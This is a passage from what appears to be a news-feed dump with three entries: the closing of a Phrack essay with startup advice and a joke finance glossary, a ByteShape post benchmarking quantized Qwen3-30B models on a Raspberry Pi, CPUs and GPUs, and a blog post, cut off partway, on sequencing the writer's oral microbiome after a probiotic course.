VALUABLE, but ARTISTICALLY VALUABLE, is equally important. There is not much economic value in a beautiful polyglot file, but it is artistically delightful. This is part of why people hate AI art: it may be economically valuable, but it is often artistically bankrupt. (Some people do use generative tools in actually original and artistic ways, but this is the exception not the norm currently.) Founders vs Investors. Here is my advice: Ignore any pressure from investors to make company "scalable" or whatever. Make sure your investors have no ability to fire you or your co-founder(s). Make sure you and co-founder are always solid and trust each other more than investors. You and your cofounders need to be BLOOD BROTHERS (/sisters/w.e). If an investor is trying to play politics with one of you to go against the other cofounder, cut that investor out immediately and stop listening to them. Any investor who pushes for scalability over what you think is the best interest of the company is not aligned with you. High-quality investors will not push for this because they are patient and in it for the long game. If you are patient, you can make a very successful company, even if it is not that scalable. High-quality investors will bet on founders and are committed; only bad ones will push for this kind of shit. I'm going to avoid giving more generic startup advice here. Go read Paul Graham's essays. But remember that any investor's perspective will not be the perspective of you and your employees. Pivoting 5 times in 24 months is not a fun experience to work at: your employees will resign while your investors celebrate your "coming of age journey"--unless everyone signed up for that terrifying emotional rollercoaster from the start. They say that "hacker" is a dying identity. Co-opted by annoying VC-backed cybersecurity companies that culturally appropriate the identity, the term is getting more polluted and diluted by the day. Meanwhile, computers are getting more secure, and they are rewriting everything in Rust with pointers-as-capability machines and memory tagging. Is it over? I disagree. As long as the hacker *ethos* is alive, regardless of any particular scene, the identity will always exist. However, now is a crucible moment as a diaspora of hackers, young and old, venture out into the world. Calling all hackers: never forget who you are, who you will become, and the mark you leave. --[ 6 - Thanks Greetz (in no particular order): * ret2jazzy, Sirenfal, ajvpot, rose4096, Transfer Learning, samczsun, tjr, claire (aka sport), and psifertex. * perfect blue, Blue Water, DiceGang, Shellphish, and all CTF players. * NotJan, nspace, xenocidewiki, and the members of pinkchan and Secret Club. * Everyone at Zellic, past and present. Finally, a big thank you to the Phrack staff (shoutout to netspooky and richinseattle!) for making this all possible. --[ 7 - References [1] https://www.sec.gov/Archives/edgar/data/1559720/000119312520315318/ d81668d424b4.htm [2] https://www.sec.gov/Archives/edgar/data/1559720/000119312522115317/ d278253ddef14a.htm [3] https://moxie.org/stories/promise-defeat/ [4] https://twitter.com/nikitabier/status/1622477273294336000 --[ 8 - Appendix: Financial institution glossary for hackers (Not serious! For jokes... :-) - IB: Investment Bank. Basically collect fat fees to do up ("advise on") M&amp;amp;As and other transactions. Help match buyers and sellers for your private equity. They are like CYA for your deal. - PE: Private Equity. Basically buy not-overly-seriously ("poorly") run companies, fire the management, then run it "professionally" (i.e. make it generally shitty for customers and employees and community for the benefit of shareholders) - HF: Hedge Fund. Trade out pricing inefficiencies - MM: Market Maker. Basically the same thing - VC: Basically gamble on tokens (crypto or stocks) and back cool and/or wacky ideas that the rest of these people find too stinky to invest in - PnD: Pump and Dump. - TVL: Total Value Locked. Basically how much money is currently in a blockchain or smart contract system. - TPS: Transactions Per Second. A measure of how scalable or useful a blockchain or database is. An oft-abused metric hacked by vaporware shillers for hype and PnD purposes. - TAM: Total Addressable ~~Memory~~ Market. Basically how much money a given idea can make. - NFA: Not finanical advice. |=[ EOF ]=---------------------------------------------------------------=| &lt;/quote&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://phrack.org/issues/71/17"/><published>2026-01-06T20:24:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46518573</id><title>A 30B Qwen Model Walks into a Raspberry Pi and Runs in Real Time</title><updated>2026-01-07T00:55:15.298353+00:00</updated><content>&lt;doc fingerprint="3edb28de9d388188"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt; A 30B Qwen Model Walks Into a Raspberry Pi√¢¬¶&lt;lb/&gt; and Runs in Real Time &lt;/head&gt;
    &lt;p&gt;For this release, we optimize for what people actually experience when they run a model: fast, high-quality responses on a specific target device.&lt;/p&gt;
    &lt;p&gt;We use Shapelearn, our bitlength learning method to choose weight datatypes for Qwen3-30B-A3B-Instruct-2507 that maximize performance in terms of tokens per second (TPS) and output quality, with one practical constraint: the model must fit comfortably in the available memory. Once it fits, making the file smaller isn't a goal by itself. We only shrink further when it also improves the real tradeoff people care about: speed vs. quality.&lt;/p&gt;
    &lt;p&gt;Approaching bitlength learning this way matters because in llama.cpp, "fewer bits" doesn't automatically mean "more speed." Different quantization formats can trigger different kernels and overheads, and on some GPUs, going lower-bit can even get slower, despite using less memory.&lt;/p&gt;
    &lt;p&gt;Bottom line: treat memory as a budget to meet, then optimize what matters most: TPS and quality.&lt;/p&gt;
    &lt;head rend="h2"&gt;TL;DR&lt;/head&gt;
    &lt;p&gt; Yes, this 30B Qwen3 runs on a Raspberry Pi. On a Pi 5 (16GB), &lt;code&gt;
              
                Q3_K_S-2.70bpw [KQ-2]
              
            &lt;/code&gt;
            hits 8.03 TPS at 2.70 BPW and maintains 94.18% of BF16 quality. It genuinely feels
            real-time. More broadly, the same pattern shows up everywhere else: ByteShape models
            give you a better TPS/quality tradeoff than the alternatives (here we look at Unsloth
            and MagicQuant).
          &lt;/p&gt;
    &lt;head rend="h2"&gt;CPUs&lt;/head&gt;
    &lt;p&gt;On CPUs, the reducing footprint via shorter bitlengths affects the TPS and accuracy tradeoff as one would expect: once the model fits, reducing footprint tends to increase TPS in a fairly monotonic way. If datatypes are selected correctly, you can trade a bit of quality for speed predictably, which makes it much easier to pick a point on the curve that matches your constraints.&lt;/p&gt;
    &lt;p&gt;We'll start with the most memory-constrained CPU case (Raspberry Pi 5 16GB), where "fits in RAM" is the limiting factor, then move to an Intel i7 with 64GB, where everything fits.&lt;/p&gt;
    &lt;head rend="h3"&gt;Raspberry Pi 5&lt;/head&gt;
    &lt;p&gt;The figure below shows TPS vs. normalized accuracy for the models that fit in RAM on the Raspberry Pi 5 16GB.&lt;/p&gt;
    &lt;p&gt;Notably, sustaining 8.5 TPS at 92%+ baseline accuracy with a 30B model on a Raspberry Pi reshapes expectations for Pi-class systems. Overall, the trend shows that ShapeLearn consistently produces better models, with ByteShape trending up and to the right of Unsloth, achieving higher tokens per second at the same quality, or higher quality at the same throughput.&lt;/p&gt;
    &lt;p&gt;We highlight choices for two primary objectives: accuracy or response time.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Optimizing for response time while maintaining accuracy: For interactive, on-device use, perceived responsiveness is driven by how quickly text appears, not peak throughput. In practice, generation feels real-time once it reaches roughly 8 TPS, comfortably above typical reading speed. In this Raspberry Pi real-time regime, &lt;code&gt;Q3_K_S-2.70bpw [KQ-2]&lt;/code&gt;(2.70 BPW, 8.03 TPS, 94.18% accuracy) is our go-to recommendation: it crosses the real-time threshold while maintaining high accuracy. Compared to Unsloth models at similar quality, ByteShape achieves real-time performance at lower BPW and higher TPS, making it the more efficient choice for interactive edge deployment.&lt;/item&gt;
      &lt;item&gt; Accuracy above all: The table below lists the models that achieve the highest accuracy while still being able to run on a Raspberry Pi. Within this set, ByteShape models make the best use of the available resources to maximize accuracy, occupying the lowest-error rows (~1.1√¢1.3% relative error, ~98.8% accuracy), while the strongest Unsloth entries remain around 2.1√¢2.2% error (~97.9% accuracy). Compared to Unsloth's &lt;code&gt;UD-Q3_K_XL [8]&lt;/code&gt;, ByteShape achieves up to a 1.87√É lower error rate while still operating at ~5√¢6 TPS, comfortably within TPS-norms on Raspberry PI making it the better choice when accuracy is the priority.&lt;lb/&gt;Even when prioritizing maximum speed with some reduction in accuracy,&lt;code&gt;Q3_K_S-3.25bpw [KQ-5]&lt;/code&gt;offers a better tradeoff: more accurate, smaller, and faster than the fastest Unsloth model.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Relative Error&lt;/cell&gt;
        &lt;cell role="head"&gt;BPW&lt;/cell&gt;
        &lt;cell role="head"&gt;TPS&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;
                    
                      Q4_K_S-3.92bpw [KQ-7]
                    
                  &lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;1.14%&lt;/cell&gt;
        &lt;cell&gt;3.92&lt;/cell&gt;
        &lt;cell&gt;5.30&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;
                    
                      Q4_K_S-3.61bpw [KQ-6]
                    
                  &lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;1.25%&lt;/cell&gt;
        &lt;cell&gt;3.61&lt;/cell&gt;
        &lt;cell&gt;5.94&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;
                    
                      Q3_K_S-3.25bpw [KQ-5]
                    
                  &lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;2.03%&lt;/cell&gt;
        &lt;cell&gt;3.25&lt;/cell&gt;
        &lt;cell&gt;6.68&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;
          &lt;code&gt;UD-IQ3_XXS [6]&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;2.22%&lt;/cell&gt;
        &lt;cell&gt;3.38&lt;/cell&gt;
        &lt;cell&gt;5.03&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;UD-Q3_K_XL [8]&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;2.13%&lt;/cell&gt;
        &lt;cell&gt;3.62&lt;/cell&gt;
        &lt;cell&gt;6.28&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Many other Unsloth and MagicQuant models (some of ours too!) are not in this chart. We compare them in other sections, but they're not applicable in the Raspberry Pi case. They simply don't fit!&lt;/p&gt;
    &lt;head rend="h3"&gt;Intel i7&lt;/head&gt;
    &lt;p&gt;Next, we move to the Intel i7 with 64GB RAM. The figure below shows TPS vs normalized accuracy for all models.&lt;/p&gt;
    &lt;p&gt;Overall, ByteShape models outperform both Unsloth and MagicQuant, delivering higher quality at comparable throughput using fewer bits per parameter. Only ByteShape offers models that run in the 26+ TPS range, extending performance well beyond the other methods.&lt;/p&gt;
    &lt;p&gt;Highlights:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Quality-first: At the high-accuracy end of the table, &lt;code&gt;IQ4_XS-4.67bpw [KQ-9]&lt;/code&gt;achieves the lowest relative error (0.25%), outperforming the best-running Unsloth models (&lt;code&gt;Q6_K [20]&lt;/code&gt;and&lt;code&gt;Q5_K_M [18]&lt;/code&gt;whose relative errors are 0.36% and 0.44%). Compared directly, ByteShape delivers up to a 1.44√É lower error rate with higher throughput than&lt;code&gt;Q6_K [20]&lt;/code&gt;, and a 1.76√É lower error rate at essentially the same speed as&lt;code&gt;Q5_K_M [18]&lt;/code&gt;. MagicQuant&lt;code&gt;mxfp4 [3]&lt;/code&gt;trails in this regime, with both higher error and lower TPS.&lt;/item&gt;
      &lt;item&gt; Balanced point: In the mid-accuracy, high-throughput region, &lt;code&gt;Q3_K_S-3.25bpw [KQ-5]&lt;/code&gt;combines ~98% accuracy with 23.1 TPS at just 3.25 BPW, offering the best overall balance in the table. Matching or exceeding this accuracy with Unsloth (&lt;code&gt;IQ4_XS [10]&lt;/code&gt;) requires higher BPW and lower TPS, while choosing an Unsloth model closer in speed (&lt;code&gt;Q3_K_S [7]&lt;/code&gt;) incurs a 1.73√É higher error rate. MagicQuant does not offer a competitive model in this range; its fastest entry (&lt;code&gt;IQ4_NL [2]&lt;/code&gt;) is behind both ByteShape and Unsloth in accuracy and throughput.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Takeaway: Across both quality-first and balanced settings, ByteShape consistently converts the available bit budget into either higher accuracy or higher TPS, and is the only approach that simultaneously covers the high-quality and 26+ TPS balanced-performance regions in this comparison.&lt;/p&gt;
    &lt;head rend="h2"&gt;GPUs: RTX5090/32GB and RTX4080/16GB&lt;/head&gt;
    &lt;p&gt;On GPUs, performance depends as much on kernel choice as on raw memory footprint. For matmul/matvec, llama.cpp's quantization-specific GPU decode paths incur very different overheads, so fewer bits per weight do not reliably translate to higher TPS. Instead, TPS often peaks at quantization-specific sweet spots. Pushing BPW lower can even increase VRAM traffic and instruction count, hurting performance rather than improving it. We dig into this behavior in more detail right after the GPU results section, where the kernel-level tradeoffs become more apparent.&lt;/p&gt;
    &lt;p&gt;We evaluate on two GPUs: an RTX 5090 (32 GB), which can run models above 4 BPW and typically reach the fastest sweet spots, and an RTX 4080 (16 GB), where &amp;gt;4 BPW models do not fit, forcing different trade-offs and making the device-optimized curve easier to see.&lt;/p&gt;
    &lt;head rend="h3"&gt;RTX 5090 (32GB of VRAM)&lt;/head&gt;
    &lt;p&gt;Let's start with the 5090, which has enough VRAM to support all of the quantized models. The figure below shows TPS vs normalized accuracy.&lt;/p&gt;
    &lt;p&gt; Two things stand out immediately:&lt;lb/&gt; First, this GPU shows a clear ~4-bit sweet spot: several ~4b models cluster at very high TPS with nearly identical quality. Examples include &lt;code&gt;Unsloth Q4_0 [12]&lt;/code&gt;, &lt;code&gt;Unsloth IQ4_XS [10]&lt;/code&gt;,
            &lt;code&gt;
              
                IQ4_XS-3.87bpw [IQ-6]
              
            &lt;/code&gt;
            , and MagicQuant &lt;code&gt;iq4_nl-EHQKOUD-IQ4NL [1]&lt;/code&gt;, all running around ~302√¢303 TPS
            at ~98.4√¢98.9% accuracy. Within 
            this tight cluster, Unsloth edges out slightly in throughput and quality.
          &lt;/p&gt;
    &lt;p&gt;Second, outside of that sweet spot, the tradeoff becomes much more uneven:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Many other Unsloth and Magic Quant models show significantly lower TPS, regardless of whether they are quantized more or less aggressively.&lt;/item&gt;
      &lt;item&gt;Past the ~4b region, only ByteShape continues to increase TPS with a more predictable reduction in quality.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt; Accuracy-critical workloads: when output quality is paramount, ByteShape delivers the most accurate model on the 5090: &lt;code&gt;
              
                IQ4_XS-4.67bpw [IQ-8]
              
            &lt;/code&gt;
            (4.67 BPW, 272.98 TPS, 99.75% accuracy). It surpasses &lt;code&gt;Unsloth Q6_K [20]&lt;/code&gt; (6.57 BPW, 264.88 TPS, 99.64% accuracy) 
            while using fewer bits and achieving slightly higher throughput, and it clearly outperforms MagicQuant 
            &lt;code&gt;mxfp4_moe-H-B16-EUR-IQ4NL-KO-Q5K-QD-Q6K [3]&lt;/code&gt; (5.46 BPW, 240.42 TPS, 99.32% accuracy) in both 
            accuracy and speed, making it the strongest choice when accuracy is a task-critical deployment requirement.
          &lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt;Practical takeaway. If your GPU has enough VRAM to run a strong ~4b model that already meets your speed and accuracy requirements, that cluster is an excellent default. The curve becomes more interesting when task-critical deployment constraints demand higher accuracy or smaller models as for example, under tighter memory budgets or constrained environments (as we'll see on the 4080). &lt;/p&gt;
    &lt;head rend="h3"&gt;RTX 4080 (16GB of VRAM)&lt;/head&gt;
    &lt;p&gt;Next, let's move to a more accessible GPU, especially in these memory-challenged times. The biggest stumbling block for the 4080 is its 16GB of VRAM, which is not sufficient to support the "magical" ~4b quantizations for a 30B model. How convenient! This "avoids" the 5090's ~4b sweet spot and forces a more "real-world" comparison under a hard VRAM budget. The figure below shows TPS versus normalized accuracy for all models that fit on the 4080.&lt;/p&gt;
    &lt;p&gt;On the RTX 4080, ByteShape consistently outperforms Unsloth under the same 16 GB VRAM constraint, delivering a better TPS√¢quality tradeoff.&lt;/p&gt;
    &lt;p&gt; In particular, ByteShape's highest-quality model that fits, &lt;code&gt;
              
                IQ4_XS-3.87bpw [IQ-6]
              
            &lt;/code&gt;
            (3.87 BPW, 214.81 TPS, 98.66% accuracy) delivers:
          &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; a 1.59√É lower error rate and 9.4% higher TPS vs. &lt;code&gt;Unsloth Q3_K_XL [8]&lt;/code&gt;(3.62 BPW, 196.42 TPS, 97.87% accuracy).&lt;/item&gt;
      &lt;item&gt; a 2.54√É lower error rate at the same TPS vs. &lt;code&gt;Unsloth IQ2_M [2]&lt;/code&gt;(2.84 BPW, 214.79 TPS, 96.59% accuracy).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As we move to higher throughput, ByteShape's maintains accuracy, while Unsloth's error rate experiences a cliff.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Elephant in the Room: When 3-bits is not just 3-bits&lt;/head&gt;
    &lt;p&gt;There is an inconvenient truth hiding in these results. On several setups, around 4 bpw is already flying, and pushing quantization harder does not make things faster. It just manages to be smaller and slower at the same time.&lt;/p&gt;
    &lt;p&gt;Reducing the size of data doesn't automatically speed things up. While using fewer bits to store each number seems like it should reduce memory traffic and speed up computation, GPUs don't work that way. NVIDIA GPUs process work in fixed groups of 32 threads called "warps," which move through instructions together in near lock-step. The GPU hardware is optimized for specific data formats, memory access patterns, and operations that the chip's circuits are physically designed to handle efficiently. When your workload matches these "golden paths", you get peak performance. Step outside them, and you hit slowdowns. This isn't a design flaw, it's a deliberate tradeoff. Supporting more flexibility would require additional circuitry: more wires, more transistors, more complexity. That extra hardware consumes more power and adds latency to every operation, whether a program needs that flexibility or not.&lt;/p&gt;
    &lt;p&gt;Here a few examples of relevant hardware "quirks": VRAM is read in aligned 32-byte blocks, so reading one or 32 bytes consumes the same memory bandwidth. Both on-chip and off-chip memories can also suffer contention depending on how data is laid out, meaning that a warp's accesses may complete in a single step or, in the worst case, be serialized into 32 steps. And of course, decoding quantized values before computation can require extra instructions, with the cost depending on the quantization scheme.&lt;/p&gt;
    &lt;p&gt;This explains the behaviour we observe: 4-bit kernels use VRAM bandwidth more efficiently than 3- or 2-bit kernels and require fewer decode steps before computation. At the same time, 4-bit kernels exploit subword parallelism just as effectively as lower-bit kernels, and all rely primarily on dynamic caches rather than shared memory to take advantage of data reuse when possible.&lt;/p&gt;
    &lt;p&gt;So why llama.cpp hasn't been optimized to deliver peak speed for every bit-length? Our understanding is that llama.cpp prioritizes portable, space-efficient quantization that can run across a wide range of hardware. That design goal limits how aggressively backends can reshape data layouts or reorder computation in ways that might help one GPU or one bit-width.&lt;/p&gt;
    &lt;p&gt;A key example is its choice to store quantized weights in fixed blocks of 256 values. Each block is self-contained (it carries everything needed to decode it) and sits at a simple, predictable offset in the tensor, which makes the format easy to implement and fast to locate.&lt;/p&gt;
    &lt;p&gt;The tradeoff is that GPUs often need to decode many blocks in parallel to keep their wide compute units busy. With many independent 256-value blocks, those parallel decodes can translate into more scattered or fragmented VRAM reads and extra decode overhead, reducing bandwidth efficiency, especially for some lower-bit formats.&lt;/p&gt;
    &lt;p&gt; Point for example on RTX 5090: a matrix multiply [256, 768] √É [768, 2048] takes ~54√Ç¬µs with &lt;code&gt;iq4_xs&lt;/code&gt; datatype, but ~62√Ç¬µs with 
            &lt;code&gt;iq3_xxs&lt;/code&gt; (mul_mat_q()+mul_mat_q_stream_k_fixup()). In other words, 
            cutting nearly 1.2 bits per weight (a reduction of more than 25% in weight footprint) leads 
            to a ~13% slowdown, directly hurting user experience.
          &lt;/p&gt;
    &lt;p&gt;An excellent reminder that bitlength learning matters: Heuristics can get us part of the way, but not all the way. ShapeLearn makes deliberate, per-tensor datatype choices that improve speed without sacrificing accuracy.&lt;/p&gt;
    &lt;head rend="h2"&gt;Methodology (brief recap)&lt;/head&gt;
    &lt;p&gt;If you're wondering how we are scoring these points, the full methodology is discussed in our previous blog post. This post is intentionally focused on the curves and device tradeoffs, so here is the quick version.&lt;/p&gt;
    &lt;p&gt;For each quantized variant, we measure throughput (TPS) on the target device and compute a single normalized quality score relative to the BF16 baseline, using the same evaluation harness and prompts as the methodology post. The quality score aggregates standard benchmarks (MMLU, GSM8K, IFEval, LiveCodeBench V4) into one number so you can compare points directly. In other words, every dot in the plots answers two questions: how fast does it run on this device, and how much quality does it retain compared to BF16, with memory fit as the first constraint.&lt;/p&gt;
    &lt;p&gt;We also want to thank all for the many, excellent suggestions on our recent Reddit post for improving and extending this evaluation strategy, and we√¢re actively working through them. Right now, evaluation is the main bottleneck and not bitlength learning/quantization. Careful evaluation is essential to clearly communicate the strengths of each model.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wrapping up&lt;/head&gt;
    &lt;p&gt;First, thank you for your tenacity. You made it through all of this without giving up. We are sincerely flattered!&lt;/p&gt;
    &lt;p&gt;The takeaway is simple: treat memory as a constraint, not a goal. Once a model fits on your device, what matters is the tradeoff curve, TPS versus quality. Across CPUs and GPUs, ByteShape consistently lands on the better side of that curve, delivering either more speed at the same quality or higher quality at the same speed.&lt;/p&gt;
    &lt;p&gt; If you're deploying on a Raspberry Pi 5 (16 GB) and want a genuinely interactive experience, start with &lt;code&gt;
              
                Q3_K_S-2.70bpw [KQ-2]
              
            &lt;/code&gt;
            . On larger CPUs or GPUs, you can move up the curve toward higher-quality points with
            little loss in throughput, the same rule applies:
            fit first, then optimize the tradeoff.
          &lt;/p&gt;
    &lt;p&gt;We'll keep releasing more device-targeted variants (and more plots). If your system can't run a 30B model smoothly, don't blame the model or the silicon. Blame the datatypes.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://byteshape.com/blogs/Qwen3-30B-A3B-Instruct-2507/"/><published>2026-01-06T20:55:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46518804</id><title>Oral microbiome sequencing after taking probiotics</title><updated>2026-01-07T00:55:15.049699+00:00</updated><content>&lt;doc fingerprint="8a7c03af02b6652a"&gt;
  &lt;main&gt;
    &lt;p&gt;Recently, a friend recommended BioGaia Prodentis to me. It is a DTC oral probiotic you can buy online that is supposedly good for oral health. I thought it would be interesting to do some sequencing to see what, if anything, it did to my oral microbiome.&lt;/p&gt;
    &lt;p&gt;BioGaia Prodentis is available online for $20 or less for a month's supply&lt;/p&gt;
    &lt;head rend="h1"&gt;BioGaia&lt;/head&gt;
    &lt;p&gt;BioGaia has a fascinating story. They are a Swedish company, founded over 30 years ago, that exclusively sells probiotics DTC. They have developed multiple strains of Limosilactobacillus reuteri, mainly for gut and oral health. They apparently sell well! Their market cap is around $1B‚Äîimpressive for a consumer biotech.&lt;/p&gt;
    &lt;p&gt;Going in, I expected scant evidence for any real benefits to their probiotics, but the data (over 250 clinical studies) is much more complete than I expected.&lt;/p&gt;
    &lt;p&gt;Most notably, their gut probiotic, Protectis, seems to have a significant effect on preventing Necrotizing Enterocolitis (NEC) in premature babies. According to their website:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;5-10% of the smallest premature infants develop NEC, a potentially lethal disorder in which portions of the bowel undergo tissue death.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;In March 2025, the FDA granted Breakthrough Therapy Designation to IBP-9414, an L. reuteri probiotic developed by BioGaia spinout IBT.&lt;/p&gt;
    &lt;p&gt;This is not specifically for the oral health product, but it's for sure more science than I expected to see going in.&lt;/p&gt;
    &lt;head rend="h3"&gt;Prodentis&lt;/head&gt;
    &lt;p&gt;BioGaia Prodentis contains two strains of L. reuteri: DSM 17938 and ATCC PTA 5289. The claimed benefits include fresher breath, healthier gums, and outcompeting harmful bacteria.&lt;/p&gt;
    &lt;head rend="h1"&gt;Sequencing with Plasmidsaurus&lt;/head&gt;
    &lt;p&gt;Many readers will be familiar with Plasmidsaurus. Founded in 2021, the team took a relatively simple idea: use massively multiplexed Oxford Nanopore (ONT) to offer complete plasmid sequencing with one day turnaround for $15, and scaled it. Plasmidsaurus quickly became part of biotech's core infrastructure, and spread like wildfire. It also inspired multiple copycats.&lt;/p&gt;
    &lt;p&gt;Compared to Illumina, ONT is faster and has much longer reads, but lower throughput and lower accuracy. This profile is a great fit to many sequencing problems like plasmid QC, where you only need megabases of sequences, but want an answer within 24 hours.&lt;/p&gt;
    &lt;p&gt;Over time, Plasmidsaurus has been adding services, including genome sequencing, RNA-Seq, and microbiome sequencing, all based on ONT sequencing.&lt;/p&gt;
    &lt;p&gt;Plasmidsaurus accepts many kinds of sample for microbiome sequencing&lt;/p&gt;
    &lt;p&gt;I used their 16S sequencing product, which costs $45 for ~5000 reads, plus $15 for DNA extraction. 16S sequencing is an efficient way to amplify and sequence a small amount of DNA (the ubiquitous 16S region) and be able to assign reads to specific species or even strains.&lt;/p&gt;
    &lt;p&gt;This experiment cost me $240 for four samples, and I got data back in around a week. It's very convenient that I no longer have to do my own sequencing. As a side note, you can pay more for more than 5000 reads, but unless you want information on very rare strains (&amp;lt;&amp;lt;1% frequency), this is a waste of money.&lt;/p&gt;
    &lt;p&gt;Sample collection is simple: take 100-250 ¬µL of saliva and mix with 500 ¬µL of Zymo DNA/RNA Shield (which I also had to buy for around $70.) You also need 2 mL screwtop tubes to ship in.&lt;/p&gt;
    &lt;p&gt;The reads are high quality for nanopore sequencing, with a median Q score of 23 (99%+ accuracy). This is more than sufficient accuracy for this experiment. The read length is very tightly distributed around 1500 nt (the length of a typical 16S region).&lt;/p&gt;
    &lt;p&gt;The results provided by Plasmidsaurus include taxonomy tables, per-read assignments, and some basic plots. I include a download of the results at the end of this article, as well as the FASTQ files.&lt;/p&gt;
    &lt;head rend="h1"&gt;The experiment&lt;/head&gt;
    &lt;p&gt;The main idea of the experiment was to see if any L. reuteri would colonize by the end of 30 days of probiotic use, and if so, whether it would persist beyond that. I collected four saliva samples:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Sample&lt;/cell&gt;
        &lt;cell role="head"&gt;Timing&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Baseline A&lt;/cell&gt;
        &lt;cell&gt;Day -4&lt;/cell&gt;
        &lt;cell&gt;A few days before starting BioGaia&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Baseline B&lt;/cell&gt;
        &lt;cell&gt;Day -1&lt;/cell&gt;
        &lt;cell&gt;The day before I started BioGaia&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Day 30&lt;/cell&gt;
        &lt;cell&gt;Day 30&lt;/cell&gt;
        &lt;cell&gt;The last day of the 30 day course&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Week after&lt;/cell&gt;
        &lt;cell&gt;Day 37&lt;/cell&gt;
        &lt;cell&gt;One week after completing the course&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Heatmap of the top 20 species. All species assignments were done by Plasmidsaurus&lt;/p&gt;
    &lt;head rend="h2"&gt;Did L. reuteri colonize?&lt;/head&gt;
    &lt;p&gt;There was no L. reuteri found in any of the samples. I did a manual analysis to check for any possible misassignments, but the closest read was only 91% identical to either L. reuteri strain.&lt;/p&gt;
    &lt;p&gt;The probiotic either (a) didn't colonize the oral cavity; (b) was present only transiently while actively taking the lozenges; (c) was below the detection threshold.&lt;/p&gt;
    &lt;p&gt;Probiotics are generally bad at colonizing, which is why you have to keep taking them. Still, I was surprised not to see a single L. reuteri read in there.&lt;/p&gt;
    &lt;head rend="h2"&gt;What actually changed?&lt;/head&gt;
    &lt;p&gt;Even though the probiotic itself didn't show up, the oral microbiome did change quite a lot.&lt;/p&gt;
    &lt;p&gt;The most striking change was a massive increase in S. salivarius. S. salivarius went from essentially absent to ~20% of my oral microbiome on the last day. However, this happened one week after I stopped taking the probiotic, so it's very unclear if it is related.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Sample&lt;/cell&gt;
        &lt;cell role="head"&gt;S. mitis&lt;/cell&gt;
        &lt;cell role="head"&gt;S. salivarius&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Baseline A&lt;/cell&gt;
        &lt;cell&gt;2.0%&lt;/cell&gt;
        &lt;cell&gt;0.4%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Baseline B&lt;/cell&gt;
        &lt;cell&gt;15.9%&lt;/cell&gt;
        &lt;cell&gt;0.0%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Day 30&lt;/cell&gt;
        &lt;cell&gt;10.2%&lt;/cell&gt;
        &lt;cell&gt;0.8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Week after&lt;/cell&gt;
        &lt;cell&gt;1.0%&lt;/cell&gt;
        &lt;cell&gt;19.3%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We see S. mitis decreasing as S. salivarius increases, while the total Streptococcus fraction stayed roughly stable. It's possible one species replaced the other within the same ecological niche.&lt;/p&gt;
    &lt;p&gt;S. salivarius is itself a probiotic species. The strain BLIS K12 was isolated from a healthy New Zealand child and is sold commercially for oral health. It produces bacteriocins that kill Streptococcus pyogenes (strep throat bacteria).&lt;/p&gt;
    &lt;p&gt;At the same time, V. tobetsuensis increased in abundance from 2.1% to 5.7%. Veillonella bacteria can't eat sugar directly‚Äîthey survive by consuming lactate that Streptococcus produces. The S. salivarius bloom is plausibly feeding them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Are these changes real or intra-day variation?&lt;/head&gt;
    &lt;p&gt;There was a lot more variation in species than I expected, especially comparing the two baseline samples. In retrospect, I should have taken multiple samples on the same day, and mixed them to smooth it out.&lt;/p&gt;
